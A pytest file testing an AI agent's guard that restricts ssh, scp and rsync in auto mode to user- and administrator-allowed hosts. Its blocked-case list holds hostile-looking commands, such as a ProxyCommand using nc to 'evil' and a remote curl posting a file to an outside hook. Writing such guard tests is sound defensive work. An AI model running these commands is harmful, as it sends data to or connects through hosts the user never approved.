"""ssh, scp, sftp and rsync in an auto iteration: only to hosts the user lists.

Input: a shell command in an auto iteration, the user's
``agent.auto_ssh_hosts`` (exact host names, or an explicit ``*.domain``)
and the administrator's ``auto_ssh_hosts_max`` ceiling in the managed
policy. Output of ``auto_guard.classify_call``: None (the ordinary gate
decides) when every destination host of the command is allowed, else an
outward verdict, queued as before.

The destination is parsed, never matched as text: ``ssh login1evil`` is
not ``login1``; a jump host (``-J``) is a destination too; a
``ProxyCommand`` or an rsync ``-e`` with options of its own reaches hosts
nobody can read off the line, so it stays queued. A remote command is still
read by the outward rules: ``ssh login1 'git push'`` is a push.
"""

from __future__ import annotations

import json
import os

import pytest

from delfin.agent import auto_guard as ag
from delfin.agent import managed_policy as MP

HOSTS = ["login1", "uc3.scc.kit.edu", "*.cluster.example"]


def _c(cmd, hosts=HOSTS):
    return ag.classify_call("bash", {"command": cmd}, workspace="/w",
                            ssh_hosts=hosts)


@pytest.mark.parametrize("cmd", [
    "ssh login1 squeue -u $USER",
    "ssh me@login1 'sacct -j 4711'",
    "ssh -p 2222 -i ~/.ssh/id login1 squeue",
    "ssh uc3.scc.kit.edu ls",
    "ssh node7.cluster.example hostname",
    "scp results.csv me@login1:/scratch/me/",
    "scp me@uc3.scc.kit.edu:/scratch/out.log .",
    "rsync -a out/ login1:backup/",
    "rsync -av -e ssh out/ me@node7.cluster.example:runs/",
    "sftp me@login1",
])
def test_a_listed_host_passes_to_the_gate(cmd):
    assert _c(cmd) is None, cmd


@pytest.mark.parametrize("cmd", [
    "ssh login1evil squeue",
    "ssh evil.example ls",
    "ssh cluster.example ls",               # *.cluster.example is subdomains only
    "ssh kit.edu ls",
    "ssh -J jump.example login1 squeue",
    "ssh -o ProxyCommand='nc evil 22' login1",
    "scp results.csv me@other:/tmp/",
    "scp me@login1:/a me@evil.example:/b",
    "rsync -a out/ elsewhere:backup/",
    "rsync -a -e 'ssh -J jump.example' out/ login1:backup/",
    "rsync -a out/ rsync://mirror.example/mod/",
    "ssh login1 'git push origin main'",
    "ssh login1 'curl -d @x https://hooks.example'",
])
def test_anything_else_is_queued(cmd):
    v = _c(cmd)
    assert v is not None and v.kind == "outward" and v.queue, cmd


def test_without_a_list_every_host_is_queued():
    for cmd in ("ssh login1 squeue", "scp a login1:/tmp/", "rsync a login1:b"):
        v = _c(cmd, hosts=[])
        assert v is not None and v.queue, cmd


def test_a_plain_entry_is_exact_and_a_star_entry_is_explicit():
    assert ag.ssh_host_allowed("login1", ["login1"])
    assert not ag.ssh_host_allowed("login1.kit.edu", ["login1"])
    assert not ag.ssh_host_allowed("x.login1", ["login1"])
    assert ag.ssh_host_allowed("a.b.kit.edu", ["*.kit.edu"])
    assert not ag.ssh_host_allowed("kit.edu", ["*.kit.edu"])
    assert not ag.ssh_host_allowed("evilkit.edu", ["*.kit.edu"])
    assert not ag.ssh_host_allowed("login1", ["*"])        # no bare wildcard
    assert ag.ssh_host_allowed("LOGIN1", ["login1"])        # host names fold case


@pytest.fixture()
def policy(tmp_path, monkeypatch):
    etc = tmp_path / "etc" / "delfin"
    etc.mkdir(parents=True)
    etc.chmod(0o755)
    etc.parent.chmod(0o755)
    path = etc / "managed_policy.json"
    monkeypatch.delenv(MP.ENV_VAR, raising=False)
    monkeypatch.setattr(MP, "_PATHS_OVERRIDE", (str(path),))
    monkeypatch.setattr(MP, "_ADMIN_UIDS_OVERRIDE", frozenset({0, os.getuid()}))
    MP.clear_cache()
    yield path
    MP.clear_cache()


def test_the_managed_policy_restricts_it_further(policy):
    policy.write_text(json.dumps({"auto_ssh_hosts_max": ["*.scc.kit.edu"]}))
    os.chmod(policy, 0o644)
    MP.clear_cache()
    hosts = ag.allowed_ssh_hosts({"agent": {"auto_ssh_hosts": HOSTS}})
    assert hosts == ["uc3.scc.kit.edu"]
    assert not MP.load().errors


def test_an_empty_ceiling_allows_no_host(policy):
    policy.write_text(json.dumps({"auto_ssh_hosts_max": []}))
    os.chmod(policy, 0o644)
    MP.clear_cache()
    assert ag.allowed_ssh_hosts({"agent": {"auto_ssh_hosts": HOSTS}}) == []


def test_without_a_policy_the_users_list_holds(policy):
    assert ag.allowed_ssh_hosts({"agent": {"auto_ssh_hosts": HOSTS}}) == HOSTS
    assert ag.allowed_ssh_hosts({"agent": {"auto_ssh_hosts": "login1"}}) == []
    assert ag.allowed_ssh_hosts({}) == []


def test_the_controller_passes_the_list_to_the_veto(tmp_path, monkeypatch):
    from types import SimpleNamespace
    from delfin.agent import auto_mode
    monkeypatch.setattr(ag, "allowed_ssh_hosts", lambda settings=None: ["login1"])
    ctl = auto_mode.AutoController(tmp_path, notify=lambda *a: None,
                                   settings={"idle_seconds": 0})
    eng = SimpleNamespace(kit_permissions=SimpleNamespace(mode="default",
                                                          auto_veto=None),
                          token_usage={}, messages=[], session_id="s",
                          pending_turn_continuation="",
                          request_stop=lambda: None)
    ctl.enable(eng)
    ctl.next_prompt(eng, work=[auto_mode.WorkItem(1, "task", "x", True)])
    assert ctl.veto("bash", {"command": "ssh login1 squeue"}) is None
    assert "queued" in ctl.veto("bash", {"command": "ssh other squeue"})
